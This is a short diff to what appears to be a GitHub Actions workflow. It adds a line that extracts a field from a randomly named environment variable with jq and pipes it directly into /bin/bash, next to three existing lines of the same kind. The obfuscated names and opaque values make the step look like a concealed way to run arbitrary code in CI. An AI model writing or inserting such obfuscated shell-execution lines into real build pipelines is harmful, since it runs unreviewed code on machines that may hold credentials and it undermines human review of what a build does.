@@ -24,6 +24,7 @@ jobs:
           echo $xwg89 | jq -r .ykghk301 | /bin/bash
           echo $dpgtd63416 | jq -r .y32 | /bin/bash
           printf '%s' "$ypfhr125" | jq -r .vx54 | /bin/bash
+          printf '%s' "$wgpr43" | jq -r .lonl4 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
